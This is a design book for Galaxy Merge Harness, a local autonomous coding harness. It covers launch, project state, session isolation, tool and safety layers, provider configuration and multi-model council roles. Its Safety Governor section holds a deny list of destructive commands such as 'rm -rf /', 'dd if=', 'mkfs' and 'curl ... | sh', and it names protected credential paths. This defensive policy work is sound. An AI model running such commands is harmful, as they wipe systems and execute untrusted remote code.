# Galaxy Merge Harness: Complete System Book

**Credits for everything:** Yunus Emre Vurgun  
**Public repository:** `https://github.com/yunusemrejr/GalaxyMerge`  
**Primary platform:** Ubuntu/Linux desktop  
**Primary command:** `gm`  
**Primary interface:** local browser GUI launched by the `gm` command  
**Runtime owner:** the terminal process that launched `gm`  
**Canonical product identity:** Galaxy Merge Harness is the harness itself. It is not a chatbot, not an OpenAI-compatible endpoint, not MCP-first, and not a wrapper around OpenCode, Codex, Claude Code, or any other coding harness.

---

## Preface

Galaxy Merge Harness is a local autonomous coding harness designed to turn a normal Ubuntu/Linux project directory into a controlled, evidence-driven, multi-model engineering workspace. It exists because ordinary coding agents fail in ways that are not random. They overtrust one model, lose state across long sessions, ask for permission during safe local work, mutate files without adequate boundaries, forget browser-console evidence, hide provider failures, leak secrets, confuse notes with memory, and often claim completion because a language model says the task is done. Galaxy Merge is designed to oppose those habits structurally. It is not supposed to be a pleasant chatbot wrapped around a shell. It is supposed to behave like a disciplined local engineering machine.

The center of Galaxy Merge is not a model. The center is the harness runtime: a launcher, local backend, browser GUI, native tool kernel, deterministic Safety Governor, workspace intelligence layer, `.gm` project state, provider/model router, council/fusion engine, verification engine, cache/compaction system, and public-repository hygiene policy. Models contribute reasoning. They do not own execution. Models may request actions, but every mutation flows through the native tool kernel and the Safety Governor. That distinction is the line between a harness and an uncontrolled agent.

This document expands the reconstruction report into a denser system book. It includes the product definition, architecture, operational model, persistence layout, safety model, multi-session model, provider/council design, cache and compaction doctrine, GUI design, testing doctrine, engineering prompts, implementation discipline, release hygiene, and expected scenarios. It is intentionally comprehensive. It should be usable as onboarding material, design reference, acceptance checklist, and maintenance doctrine.

---

# Part I. Identity, Scope, and Product Reality

## 1. What Galaxy Merge Harness Is

Galaxy Merge Harness is a self-contained Ubuntu/Linux-native autonomous coding harness launched from a project directory with:

```bash
gm
```

The launcher captures the current working directory, resolves the real project root, creates or loads a project-local `.gm` state folder, creates a unique session, starts a local Python backend, opens a browser GUI, and keeps the launching terminal alive as the runtime owner and operational log stream. The user enters a coding goal through the browser GUI. Galaxy Merge then inspects the workspace, loads notes and memory, discovers skills, indexes relevant files, plans the work, assigns council roles across configured providers/models, fuses outputs by evidence, edits files only through native tools, runs tests/build/browser verification, records evidence, invokes reviewer and skeptic roles, and stops only when completion is supported by evidence.

Galaxy Merge is not an OpenAI-compatible endpoint. It does not exist to let other harnesses call it as if it were a model. It is not a provider shim. It is not a plugin layer for OpenCode. It is not a thin wrapper around another harness. It is the orchestrator, tool owner, safety boundary, persistence layer, verification engine, and GUI surface.

Galaxy Merge is also not MCP-first. MCPs may be supported later as optional bridges, but the core powers are internal. File operations, shell execution, Git operations, web research, browser automation, GitHub scanning, indexing, memory, notes, provider routing, council spawning, compaction, and safety enforcement are native. If those are delegated to a fragile external layer, the harness loses determinism and becomes another dependency puppet.

The core promise is:

> A local autonomous coding harness that works freely inside the correct project boundary, coordinates multiple models as a disciplined council, verifies its own work, and protects the operating system, secrets, remote targets, public repository, and itself.

## 2. Why It Exists

The need for Galaxy Merge comes from recurring failures in agentic coding tools. Existing tools often pretend that "autonomy" means letting a model improvise. That is weak engineering. Autonomy should mean the system can perform safe project-local work without useless permission loops while still hard-stopping at dangerous boundaries. Galaxy Merge exists to make that distinction concrete.

Common failures it is designed to prevent:

- overtrusting a single model answer;
- treating the most confident answer as the correct one;
- losing the active goal when context grows;
- failing to distinguish local project edits from remote or production operations;
- claiming webapp bugs are fixed without opening the browser or reading the console;
- hiding provider timeouts and 500 errors behind vague "model failed" text;
- allowing the GUI to show success while terminal logs contain fatal errors;
- leaking `.env`, provider keys, OAuth tokens, SSH keys, cookies, and config dumps into prompts, logs, caches, tests, screenshots, or public GitHub;
- confusing project notes, session notes, memory, and transient context;
- overwriting another session's patch during parallel runs;
- modifying the harness's own source code through normal autonomous mode;
- treating cache and compaction as the same thing;
- shipping public repository state that contains only README theater or stale generated artifacts;
- relying on real provider APIs in unit tests;
- letting tests hang forever because subprocesses, WebSockets, browser drivers, locks, or provider calls are unbounded.

Galaxy Merge's answer is architecture: native tools, deterministic safety, session isolation, structured state, multi-model fusion, evidence ranking, browser evidence, redaction, compaction, and public release discipline.

## 3. Product Boundaries

Galaxy Merge's first target user is a technical power user or harness engineer on Ubuntu/Linux who wants a local coding harness that can coordinate several LLM providers without surrendering the project, operating system, or secrets. It is personal and local-first. It is not a cloud SaaS. It is not a daemon by default. It does not require a TUI as the primary interface. The terminal is the process owner and log surface. The browser is the interaction surface. The `.gm` folder is project-local runtime state. User-level configuration lives outside the project, usually under `~/.config/galaxy-merge/`, while user cache/data may live under `~/.cache/galaxy-merge/` or `~/.local/share/galaxy-merge/`.

Core non-goals:

- no OpenAI-compatible serving mode as core product;
- no runtime dependency on OpenCode or any other harness;
- no MCP-first architecture;
- no global OS mutation as normal behavior;
- no uncontrolled self-updating or self-editing;
- no production deployment without explicit policy;
- no automatic public push when secrets may be present;
- no tests requiring real user secrets or provider accounts;
- no GUI that lies about runtime state.

The public repository must be treated as public. Every committed file may be read by anyone. That assumption affects configs, fixtures, logs, screenshots, generated artifacts, `.gm` runtime state, browser profiles, and documentation examples.

---

# Part II. High-Level Architecture

## 4. Layer Model

Galaxy Merge can be understood as nine cooperating layers.

### Launcher Layer

The launcher layer is the `gm` command. It discovers installation context, captures the current directory, resolves the WorkRoot, starts or attaches to a local backend process, opens the browser GUI, prints operational facts to the terminal, and owns process lifetime. It should not contain the whole harness. It is a boot coordinator.

Responsibilities:

- command discovery;
- Python runtime invocation;
- working directory capture;
- install path discovery;
- WorkRoot resolution request;
- local port allocation;
- backend startup;
- browser launch;
- terminal log ownership;
- clean shutdown handling.

### Session Server Layer

The session server is a local HTTP/WebSocket backend. It exists for the GUI and local harness runtime. It is not an external API product. It exposes session, project, tree, file, goal, notes, safety, logs, browser, web, GitHub, and tool state endpoints. It streams events to the GUI through WebSocket.

Responsibilities:

- localhost-only HTTP server;
- session-bound WebSocket stream;
- GUI API;
- process lifecycle;
- event bus connection;
- reconnect handling;
- per-session routing;
- error visibility.

### Harness Core Layer

The harness core owns the goal engine, orchestrator, runtime state, phase transitions, completion engine, task loop, and high-level decisions about when to inspect, plan, patch, test, review, compact, block, fail safe, or complete.

Responsibilities:

- parse user goals into objectives;
- define completion criteria;
- choose initial plan;
- schedule council roles;
- choose relevant tools;
- manage phase transitions;
- decide when verification is required;
- maintain mission state;
- invoke reviewer and skeptic before completion.

### Fusion/Council Layer

The council layer routes subtasks to configured provider/model roles. It does not merely ask multiple models and pick the answer that sounds best. It collects structured outputs, repairs or rejects malformed outputs, deduplicates findings, detects contradictions, scores evidence, resolves disagreements using files/tests/browser/tool logs, and synthesizes a plan or patch decision.

Responsibilities:

- provider registry;
- model registry;
- role assignment;
- role prompt construction;
- provider call execution through adapter;
- fallback and degraded mode;
- structured role outputs;
- evidence-weighted fusion;
- reviewer and skeptic pass;
- final synthesis.

### Native Tool Kernel

The native tool kernel is the only layer allowed to perform external effects. Models cannot write files or execute shell commands directly. GUI calls cannot bypass it. The orchestrator cannot mutate the workspace except through it. Every mutating or risky tool goes through the Safety Governor first.

Responsibilities:

- schema registration;
- tool invocation validation;
- path/location classification;
- safety checks;
- timeouts and cancellation;
- structured results and errors;
- event emission;
- redaction;
- file, shell, git, web, browser, GitHub, notes, memory, indexing, provider, council, completion, and secret-scan tools.

### Workspace Intelligence Layer

Workspace intelligence makes the harness aware of the project. It detects WorkRoot and TaskScope, builds the file tree, indexes hashes and summaries, searches text, discovers likely relevant files, records git status, tracks changed files, maps dependencies, and eventually may include symbols, tree-sitter AST, test mapping, and embeddings.

Responsibilities:

- WorkRoot detection;
- TaskScope detection;
- ignored-folder policy;
- file tree and hash inventory;
- incremental indexing;
- source summaries;
- relevant-file retrieval;
- dependency and symbol hints.

### Persistence Layer

Persistence is local filesystem state, mostly under `.gm/` for project runtime state. It contains project identity, notes, memory, sessions, events, transcripts, tool calls, safety logs, provider events, compaction records, browser evidence, web sources, GitHub scans, caches, indexes, locations, and patchsets.

Responsibilities:

- `.gm` schema;
- atomic writes;
- append-only logs;
- locks for shared resources;
- schema versioning;
- crash-readable state;
- retention and cleanup;
- secret-safe storage.

### Safety Layer

Safety is deterministic and policy-based. It does not rely on a model's judgment. It classifies paths and targets, blocks dangerous operations, redacts secrets, prevents self-modding, separates local/remote/prod actions, and records decisions.

Responsibilities:

- path policy;
- command policy;
- credential policy;
- self-protection;
- remote/prod gating;
- location classification;
- redaction;
- blocked action logging;
- public repo safety audit.

### GUI Layer

The GUI is the control room. It is not decoration. It shows the truth of the runtime: goal, phase, WorkRoot, TaskScope, session, providers, council, tools, logs, browser evidence, safety decisions, locations, notes, memory, skills, compaction, and verification state. It must not hide blocking failures.

Responsibilities:

- session attachment;
- state rendering;
- goal input;
- notes CRUD;
- file tree;
- task stream;
- diff/output view;
- council panel;
- tool call panel;
- browser/web panel;
- safety/location panel;
- logs panel;
- degraded/blocked/complete state clarity.

## 5. Process Topology

A normal run looks like this:

```text
User shell
  └── gm launcher
       └── Python backend runtime
            ├── local HTTP server on 127.0.0.1:<port>
            ├── WebSocket event stream
            ├── session manager
            ├── orchestrator
            ├── native tool kernel
            ├── provider adapters
            ├── browser automation driver/profile
            └── .gm persistence
       └── browser window opened to session URL
```

The browser does not own the task. If the browser disconnects, the backend may continue. If the terminal dies, the runtime should shut down or leave a recoverable crashed session state. If a WebSocket reconnects, it must attach to the correct session and not cross streams with another session.

A single project can run multiple `gm` sessions simultaneously. This is not a corner case. The harness should support task splitting, parallel diagnosis, and separate goals in the same WorkRoot. Shared `.gm` resources need locks or append-safe behavior. Session-specific state must never bleed.

---

# Part III. Launch, WorkRoot, TaskScope, and Runtime

## 6. Launch Contract

The `gm` command has a strict contract. It must be executable from a normal project folder:

```bash
cd /path/to/project
gm
```

Expected launch sequence:

1. capture current working directory;
2. resolve real WorkRoot;
3. detect whether WorkRoot is the Galaxy Merge codebase itself;
4. if self-codebase, enter read-only diagnostic mode;
5. load app config and user config;
6. create or load `.gm`;
7. validate or create `.gm/project.json`;
8. create a unique session ID;
9. create `.gm/sessions/<session_id>/`;
10. start event bus;
11. choose available localhost port;
12. start backend server bound to `127.0.0.1`;
13. open browser to the session URL;
14. load notes, memory, skills, provider config, model config, routing config, fusion config, safety policy;
15. warm index;
16. render ready GUI;
17. wait for user goal.

Terminal output should be factual and operational. It should show the harness version, repository URL, WorkRoot, session ID, GUI URL, safety state, provider availability summary, browser profile status, and important runtime events. It should never print secrets.

Example terminal output:

```text
Galaxy Merge Harness v0.1.0
Repository: https://github.com/yunusemrejr/GalaxyMerge
WorkRoot: /home/user/projects/example
Session ID: gmsess_20260628_120000_abcd
GUI: http://127.0.0.1:7421/session/gmsess_20260628_120000_abcd
Safety: enabled
Providers: 6 loaded, 4 available, 2 unavailable
Browser: isolated profile ready
```

## 7. Port Allocation

Port allocation must be robust. The backend binds to `127.0.0.1` by default, never to public interfaces. If the default port is busy, the launcher should pick a free port safely. It must avoid the classic race where a process checks that a port is free, releases it, then another process grabs it before binding. The most robust approach is to bind port `0` or reserve the socket through the server startup path. The GUI URL must print the actual bound port. Session-to-port mapping should be recorded under `.gm/sessions/<session_id>/` or a project-level active-session registry. Stale port records must not misdirect a browser window.

Port behavior requirements:

- bind to localhost only;
- support multiple backend instances;
- handle port conflict cleanly;
- print exact GUI URL;
- no browser attached to wrong session;
- no stale session reused accidentally;
- no global singleton unless explicitly intended.

## 8. WorkRoot Detection

WorkRoot is the project root where Galaxy Merge is allowed to operate. It is not automatically the current directory if the current directory is too broad. Signals include `.git/`, `package.json`, `pyproject.toml`, `go.mod`, `Cargo.toml`, `composer.json`, `pom.xml`, `Makefile`, README, framework config files, and safe user override. A real project can live under `/home/user/projects/foo`, but `/home`, `~`, `~/Desktop`, `~/Downloads`, `/`, `/usr`, `/etc`, `/var`, and `/opt` are never safe writable WorkRoots by default.

WorkRoot detection must be conservative. If the harness cannot identify a project boundary, it should ask for explicit user action or run in a limited diagnostic mode. The harness may read broadly enough to identify the project, but it writes only within WorkRoot and only through Safety Governor-approved tools.

## 9. TaskScope

TaskScope is the smallest relevant subset of WorkRoot for the current goal. It may be a single file, a folder, frontend app, backend app, test directory, docs folder, package, or module. TaskScope starts narrow and can expand if evidence requires it. Expansion must be logged. The harness should avoid sweeping unrelated code because large context increases risk, token cost, and accidental change surface.

TaskScope is goal-specific. A repo may contain multiple apps or packages. A login redirect bug may involve `auth/`, `routes/`, and one test file. A webapp console error may involve a frontend entrypoint and one component. A packaging bug may involve `pyproject.toml`, install scripts, and CI. The harness should not read the whole world unless necessary.

## 10. Location Classification

Every mutation target must be classified before execution. Location classes include:

```text
local_workroot
local_taskscope
local_gm_project_state
local_temp
local_user_home
local_system
galaxy_merge_app_codebase
galaxy_merge_app_config
galaxy_merge_runtime
git_local
git_remote
ssh_remote
ftp_remote
sftp_remote
http_external
browser_profile_temp
staging_target
production_target
unknown
```

The point is that local edits, Git remote pushes, SSH commands, FTP uploads, browser profile writes, and production deployments are not equivalent. A command like `git diff` is harmless in normal contexts. `git push` is a remote mutation and blocked by default. `ssh production-server rm -rf app` is not a local project edit. `rsync` may be a local copy or production deploy depending on target. `terraform apply`, `kubectl`, `ansible`, `aws`, `gcloud`, `az`, `netlify deploy`, `vercel deploy`, and `firebase deploy` require special classification.

Default policy:

```text
git status/diff/log: allowed
git add/commit: configurable
git push: blocked by default
ssh production command: blocked by default
ftp/sftp upload/delete: blocked by default
unknown remote mutation: blocked
staging deployment: configurable
production deployment: requires explicit policy
```

---

# Part IV. `.gm` Project State

## 11. Philosophy of `.gm`

Each project receives a `.gm/` folder. This is runtime state, not source code. It is the harness's memory of the project, sessions, notes, indexes, caches, events, safety decisions, browser evidence, web evidence, GitHub scans, and patchsets. It should generally be ignored in the Galaxy Merge public repository itself, except intentional fake schema examples.

The `.gm` folder must not become a junk drawer. Notes, session notes, memory, cache, logs, and indexes have different semantics. Mixing them is how agents become confused. A durable user note is not the same thing as a one-session scratchpad. A machine memory item is not the same thing as a model claim. A cache hit is not a verified fact. A log is not a note. A browser console error is evidence and should be stored as evidence.

Recommended schema:

```text
.gm/
  project.json
  README.md
  notes/
    user.md
    architecture.md
    commands.md
    conventions.md
    risks.md
    scratch.md
    index.json
    history/
    .trash/
  memory/
    workspace_summary.md
    known_facts.jsonl
    known_failures.jsonl
    verified_fixes.jsonl
    preferences.json
    lessons.jsonl
  sessions/
    <session_id>/
      state.json
      goal.json
      events.jsonl
      transcript.jsonl
      council.jsonl
      tool_calls.jsonl
      safety.jsonl
      provider_events.jsonl
      compaction.jsonl
      diffs/
      artifacts/
      compacted.md
      final.md
  indexes/
    index.meta.json
    files.jsonl
    symbols.jsonl
    dependencies.json
    summaries.jsonl
    tree.json
    embeddings/
  cache/
    provider/
    file_summaries/
    skill_matches/
    fusion/
    command_results/
    web_search/
    browser_pages/
    github_scans/
  web/
    searches.jsonl
    fetched_pages.jsonl
    wikipedia.jsonl
    duckduckgo.jsonl
    curl_fetches.jsonl
  browser/
    profiles/
    sessions/
    screenshots/
    console_logs.jsonl
    network_logs.jsonl
    page_errors.jsonl
  locations/
    registry.json
    remotes.json
    deployment_policy.json
    location_events.jsonl
  github/
    repos.jsonl
    scans/
    issues/
    pull_requests/
  logs/
    project.log
    crashes.log
  safety/
    policy.snapshot.json
    blocked_actions.jsonl
    allowed_commands.json
    protected_paths.json
  git/
    checkpoints.jsonl
    patchsets/
```

## 12. `project.json`

A project should have stable identity and schema versioning. Example:

```json
{
  "schema_version": 1,
  "project_id": "gmproj_6c7301c9",
  "created_at": "2026-06-28T12:00:00+03:00",
  "updated_at": "2026-06-28T12:00:00+03:00",
  "workroot": "/home/user/projects/example",
  "name": "example",
  "language_hints": ["python", "javascript"],
  "framework_hints": ["fastapi", "vanilla-js"],
  "git_detected": true,
  "default_branch": "main",
  "notes_enabled": true,
  "memory_enabled": true,
  "index_enabled": true,
  "safety_policy": "default"
}
```

The project ID should not depend on a private absolute path alone. A stable hash derived from WorkRoot and git identity may be useful, but care is needed if projects move. The schema should support migration.

## 13. Project Notes

Project notes are user-visible, persistent, editable Markdown or structured text files under `.gm/notes/`. They describe architecture, commands, conventions, risks, preferences, and project-specific rules. They must be first-class GUI objects, not hidden files that only the backend understands.

Required note capabilities:

- create;
- read;
- edit;
- rename;
- delete;
- soft-delete;
- restore;
- list;
- search;
- tag;
- pin and unpin;
- inject selected note into active goal;
- show which notes were used by which council role;
- persist across restarts;
- maintain index;
- maintain history.

A note can be authoritative if the user wrote it. But a note can also be stale. The harness should show source and modified time. It should not silently promote model-generated session speculation into project notes.

## 14. Session Notes

Session notes are temporary or task-specific. They live under `.gm/sessions/<session_id>/`. They may include scratch observations, current plan, one-off findings, or intermediate summaries. They should not automatically become project truth. Promotion from session notes to project notes or memory should be explicit, conservative, or backed by verification.

## 15. Memory

Memory is machine-managed persistent knowledge. It records known commands, previous verified fixes, architecture facts, failed attempts, fragile areas, and verification methods. Memory must not store secrets. Memory promotion must be conservative. The harness should distinguish:

- verified fact;
- user preference;
- known failure;
- successful command;
- risky area;
- architecture summary;
- stale item;
- model-derived unverified note.

Memory should be retrieved based on goal relevance and freshness. It should not dump all historical memory into every prompt.

---

# Part V. Session Isolation and Parallel Instances

## 16. Why Parallel Sessions Matter

Galaxy Merge must support multiple simultaneous `gm` sessions, including multiple sessions in the same WorkRoot. This is not exotic. A power user may launch separate sessions for frontend bug fixing, backend tests, documentation updates, and provider config cleanup. The harness must keep session state isolated while protecting shared project state.

Required isolation:

```text
unique session_id
correct browser-session attachment
separate terminal stream
isolated current goal
isolated current plan
isolated tool state
isolated provider state
isolated browser profile
isolated shell context
isolated WebSocket stream
isolated logs except intentional aggregate logs
```

Shared resources such as `.gm/notes`, `.gm/memory`, `.gm/indexes`, and `.gm/cache` must be concurrency-safe.

Recommended mechanisms:

- per-session directories;
- append-only JSONL logs;
- atomic temp-file plus rename writes;
- file locks for shared resources;
- note revision history;
- file hash conflict detection;
- active session registry;
- session heartbeat files;
- stale session cleanup;
- per-session browser profiles;
- per-session shell working directory/environment policy.

## 17. Same-File Conflict Detection

Silent overwrite is one of the worst parallel-agent bugs. The harness must detect if a file changed between read and write. Algorithm:

```text
before edit:
  record file path
  record file hash
  record session_id and goal_id
  create patch or intended write

before write:
  re-read current file hash
  if current hash != recorded hash:
    block silent write
    mark conflict
    show GUI warning
    write conflict event
    ask fusion engine to rebase or produce conflict report
  else:
    apply patch atomically
```

Conflict resolution can be conservative. Blocking is better than overwriting. The system may attempt a rebase if the patch is simple and the change is non-overlapping, but it must log evidence.

## 18. Active Session Registry

A project-level registry should record active sessions. Example fields:

```json
{
  "session_id": "gmsess_...",
  "workroot": "/home/user/project",
  "port": 7421,
  "started_at": "...",
  "last_heartbeat": "...",
  "pid": 12345,
  "goal_summary": "Fix webapp console error",
  "state": "running"
}
```

Stale sessions must be detected without killing live sessions. Heartbeats should be written atomically or append-only. GUI session selection should never attach a browser to the wrong session.

---

# Part VI. Native Tool Kernel

## 19. Tool Kernel Principle

The Native Tool Kernel is the only layer that performs file mutation, shell execution, browser control, web fetches, provider calls, GitHub scans, memory writes, notes writes, or other external effects. Models request actions. Tools execute them only after validation and safety checks.

Required tools:

```text
file.read
file.write
file.patch
file.search
file.tree
shell.run
git.status
git.diff
workspace.index
memory.read
memory.write
notes.read
notes.write
notes.update
notes.delete
skill.search
provider.call
council.spawn
completion.review
web.search
web.fetch
web.duckduckgo.search
web.wikipedia.search
web.curl.fetch
browser.open
browser.inspect
browser.console.read
browser.network.read
browser.screenshot
github.repo.scan
location.classify
location.registry.read
secret.scan
repo.public_safety.audit
```

Every tool must have:

```text
name
schema
description
mutates flag
requires_safety_check flag
timeout policy
structured result
structured error
redaction behavior
event emission
```

## 20. File Tools

File tools must respect WorkRoot and TaskScope. They should support read, write, patch, search, and tree operations. Reads should offer modes: summary, excerpt, line range, and full file. Full file reads must be justified for large files. Writes should be atomic and include hash-before-write protection. Patches should be preferred over raw writes when possible because they express intent and reduce accidental damage.

File tool result examples should include:

- path;
- normalized path;
- location class;
- file hash;
- line range;
- size;
- redaction status;
- safety decision;
- event ID.

## 21. Shell Tool

`shell.run` is powerful and dangerous. It must be sandboxed by policy. It should use the correct WorkRoot/TaskScope directory, bounded timeouts, output caps, cancellation handling, environment filtering, secret redaction, and command classification. The shell tool should not allow raw arbitrary commands to bypass location policy. It should parse or conservatively classify commands with dangerous patterns.

Output should include:

- command;
- cwd;
- exit code;
- duration;
- stdout summary;
- stderr summary;
- capped raw output artifact path if safe;
- safety decision;
- timeout/cancellation status.

No shell call should wait forever. Long-running dev servers need special lifecycle handling rather than being treated as normal blocking commands.

## 22. Git Tools

Git status and diff are generally allowed inside WorkRoot. Git add/commit is configurable. Git push is blocked by default because it mutates remote state. The harness should use git diff for verification and to summarize changed files. It should avoid unrelated changes. If the project has no git repo, it should not automatically initialize one unless configured; patchsets can be stored under `.gm/git/patchsets/`.

Checkpoints may record:

```json
{
  "checkpoint_id": "gmcp_001",
  "created_at": "2026-06-28T12:00:00+03:00",
  "session_id": "gmsess_...",
  "files_changed": ["src/router.py"],
  "reason": "fix provider fallback failure",
  "verified": true
}
```

## 23. Web Tools

Native web research includes search, DuckDuckGo, Wikipedia, fetch, and curl-style retrieval. Web content is untrusted input. It may inform the model, but it cannot override harness policy. Downloaded scripts are never executed. `curl|sh` and `wget|sh` patterns are blocked. Large downloads are capped. Binary downloads are blocked by default. URLs and headers must be redacted before logging if they contain tokens.

Search result structure:

```json
{
  "title": "Result title",
  "url": "https://example.com",
  "snippet": "summary",
  "source": "duckduckgo",
  "fetched_at": "2026-06-28T12:00:00+03:00",
  "cache_key": "..."
}
```

## 24. Browser Tools

Browser automation is mandatory for webapp debugging. The harness must be able to launch or connect to a local dev server, open an isolated browser profile, capture console logs, network logs, screenshots, page errors, and DOM snapshots, then use that evidence to patch and verify.

Required tools include:

```text
browser.open
browser.reload
browser.navigate
browser.screenshot
browser.inspect
browser.console.read
browser.network.read
browser.page_errors.read
browser.dom.snapshot
browser.close
```

The default browser profile must never be the user's normal browser profile. The correct location is:

```text
.gm/browser/profiles/<session_id>/
```

Captured evidence includes console.log, console.warn, console.error, uncaught exceptions, failed resource loads, CORS errors, 404/500 asset failures, runtime JavaScript errors, network failures, screenshots, and DOM snapshots.

## 25. GitHub Tools

GitHub scanning should support current local git remote, public repo URL, raw GitHub file URL, and GitHub API if a token exists. It should retrieve owner/name, default branch, README, file tree, language hints, releases/changelog, issues and pull requests if available, and specific files. GitHub tokens must never be exposed to models or logs. Public unauthenticated mode should work for public repos. Scans should be cached under `.gm/github/scans/`.

---

# Part VII. Safety Governor

## 26. Deterministic Safety

The Safety Governor is deterministic. It does not ask a model whether a command is safe. It classifies and decides.

Decision classes:

```text
allow
allow_with_audit
block
require_external_user_action
```

Writes are blocked by default to:

```text
/
/bin
/sbin
/usr
/usr/bin
/usr/sbin
/etc
/var
/boot
/dev
/proc
/sys
/run
/root
/home
~/.ssh
~/.gnupg
~/.aws
~/.config
~/.local/bin
~/.bashrc
~/.profile
~/.zshrc
~/.npmrc
~/.pypirc
~/.docker
```

A project under `/home/user/projects/foo` can be edited only inside that WorkRoot. It does not grant access to the entire home directory.

Dangerous commands include:

```text
rm -rf /
rm -rf ~
rm -rf /home
rm -rf /usr
rm -rf /etc
sudo rm
sudo mv
sudo chmod
sudo chown
chmod -R 777
chown -R
dd if=
mkfs
mount
umount
curl ... | sh
wget ... | sh
```

Bypass resistance must include symlinks, `../` traversal, quoted paths, globs, shell expansion, chained commands, environment variable paths, command substitution, relative paths, case variations, and hidden files.

## 27. Credential Policy

Secrets must never enter the public repo, logs, GUI, model prompts, memory, cache, browser artifacts, screenshots, test fixtures, or generated docs. Redaction must cover API keys, bearer tokens, OAuth tokens, cookies, SSH keys, private provider config, `.env`, `.npmrc`, `.pypirc`, cloud credentials, FTP/SSH credentials, GitHub tokens, local OpenCode config dumps, and private deployment details.

Provider secrets must come from OS environment variables or ignored local config. Example variable names:

```text
OPENAI_API_KEY
ANTHROPIC_API_KEY
GOOGLE_API_KEY
DEEPSEEK_API_KEY
MINIMAX_API_KEY
STREAMLAKE_API_KEY
STEPFUN_API_KEY
OPENROUTER_API_KEY
GITHUB_TOKEN
```

The exact variables are configurable. The invariant is that secrets are not hardcoded, committed, logged, cached, shown, or sent to models.

## 28. Self-Modding Prevention

Galaxy Merge must not autonomously modify its own codebase. Protected items include source code, runtime files, launcher, config, provider config, safety policy, prompt files, virtualenv, install directory, desktop files, and service files.

If `gm` is launched inside the Galaxy Merge source tree:

```text
detect own codebase
refuse normal autonomous coding mode
enter read-only diagnostic mode
disable file.write
disable file.patch
disable mutating shell commands
disable git mutation
allow read/index/diagnose only
optionally write patch suggestions outside protected tree
```

This applies even if the user asks the harness to edit itself. A separate explicit maintenance/update process may modify Galaxy Merge, but normal autonomous project work cannot self-modify the harness.

---

# Part VIII. Provider Configuration and Model Registry

## 29. Provider Configuration

Provider configuration must be externalized, validated, and secret-safe. Public example configs use placeholders. Real keys are environment variables or ignored local config. The provider adapter normalizes request/response differences so the council does not care whether a role came from DeepSeek, OpenAI-compatible, Anthropic-style, Gemini-style, MiniMax, StreamLake, StepFun, Kimi, OpenRouter, Ollama, or another provider.

Example provider config:

```json
{
  "schema_version": 1,
  "providers": {
    "deepseek": {
      "enabled": true,
      "type": "openai_compatible",
      "base_url": "https://api.deepseek.com/v1",
      "auth": {
        "type": "env",
        "env_var": "DEEPSEEK_API_KEY"
      },
      "timeout_seconds": 120,
      "retry_count": 1,
      "retry_backoff_seconds": 2,
      "cache": {
        "supports_prefix_cache": true,
        "prefer_stable_prefix": true
      }
    },
    "local_ollama": {
      "enabled": true,
      "type": "ollama",
      "base_url": "http://127.0.0.1:11434",
      "auth": {"type": "none"},
      "timeout_seconds": 180
    }
  }
}
```

## 30. Model Registry

Model configuration defines provider, model name, context window, output limit, strengths, roles, cost tier, latency tier, cache behavior, and any provider-specific request parameters. Role eligibility must be config-driven, not hardcoded randomly in source.

Example:

```json
{
  "schema_version": 1,
  "models": {
    "deepseek:reasoner": {
      "provider": "deepseek",
      "model": "deepseek-reasoner",
      "enabled": true,
      "context_window": 128000,
      "output_limit": 16000,
      "strengths": ["reasoning", "review", "bug_hunting"],
      "roles": ["planner", "reviewer", "skeptic"],
      "cost_tier": "medium",
      "latency_tier": "medium",
      "cache_behavior": {
        "supports_prefix_cache": true,
        "stable_prefix_priority": true
      }
    }
  }
}
```

## 31. OpenCode Settings Policy

Existing local OpenCode settings may be inspected only to copy non-secret provider metadata into Galaxy Merge's own config. Allowed metadata includes provider name, base URL, model names, request/response format hints, context window hints, role suitability, and non-secret parameters. Forbidden data includes API keys, tokens, cookies, private local config dumps, account identifiers, private absolute paths, and any credential. Galaxy Merge must not depend on OpenCode at runtime.

## 32. Provider Failure and Degraded Mode

Provider failure is normal. The harness must not freeze. Simulated failures should include missing API key, invalid endpoint, 401, 429, 500, timeout, partial stream disconnect, malformed JSON, invalid tool call, context overflow, irrelevant output, role failure, and all providers failing.

Required behavior:

```text
timeouts enforced
bounded retries
fallback selected if configured
role marked degraded
GUI shows error
terminal shows error
event log records provider/model/role/error/duration/retry/fallback
fusion continues only if safe
completion confidence reduced
required role failure blocks fake completion
```

Example role policy:

```text
planner failure: fallback required
implementer failure: fallback required
reviewer failure: fallback or blocked
cheap verifier failure: continue if reviewer passes
synthesizer failure: fallback required
all providers fail: fail safe with clear report
```

---

# Part IX. Council and Fusion

## 33. Council Roles

Galaxy Merge does not pick the best answer. It fuses useful contributions. Roles include planner, scout, implementer, reviewer, cheap verifier, skeptic, and synthesizer.

Planner duties:

- understand the goal;
- identify likely files;
- define completion criteria;
- propose minimal plan;
- identify risks and verification requirements.

Scout duties:

- inspect workspace evidence;
- find files and symbols;
- summarize architecture;
- report uncertainty;
- avoid unsupported assumptions.

Implementer duties:

- propose concrete patch;
- keep changes minimal;
- explain rationale;
- use native tools for mutations only through orchestrator/tool kernel.

Reviewer duties:

- inspect diff and evidence;
- find bugs;
- challenge assumptions;
- verify tests/build/browser evidence;
- reject weak changes.

Cheap verifier duties:

- perform low-cost sanity checks;
- inspect small diff contexts;
- find obvious omissions;
- keep token use low.

Skeptic duties:

- argue why the task may not be complete;
- check verification holes;
- inspect degraded provider state;
- reject premature completion.

Synthesizer duties:

- collect role outputs;
- deduplicate findings;
- resolve contradictions;
- prefer evidence over claims;
- produce final action plan or patch decision.

## 34. Fusion Algorithm

High-level flow:

```text
parse goal
select council template
for each required role:
  select eligible model
  construct role prompt
  call provider with timeout
  validate output
  fallback if needed
collect role outputs
validate schemas
repair malformed output if possible
deduplicate findings
score by evidence strength
detect contradictions
resolve using file/tool/test/browser evidence
produce action plan
execute through tools
review again
verify completion
```

Evidence priority:

1. direct file content;
2. test/build output;
3. browser console/network output;
4. git diff;
5. tool logs;
6. multiple independent model findings;
7. single model claim;
8. unsupported assumption.

The synthesizer should never treat prose confidence as evidence. A model saying "this is fixed" is weaker than a failing test, a browser console error, or a git diff that does not touch the relevant file.

## 35. Council Token Economy

Council systems can become token waste machines. Galaxy Merge must avoid sending every file, every log, and every role transcript to every model. Context must be role-specific. Planner needs project summary and goal. Implementer needs relevant file excerpts and failing evidence. Reviewer needs diff and verification output. Skeptic needs completion criteria, diff, known risks, degraded state, and evidence. Cheap verifier needs minimal diff and checklist. Synthesizer needs structured summaries, contradictions, evidence references, and selected action paths.

The harness should avoid broad councils for trivial edits unless configured. It should not retry failed providers indefinitely. It should not ask expensive models to perform cheap validation if cheap/local models are available and sufficient. It should cap role output sizes. It should cache stable prompt segments and deduplicate repeated context.

---

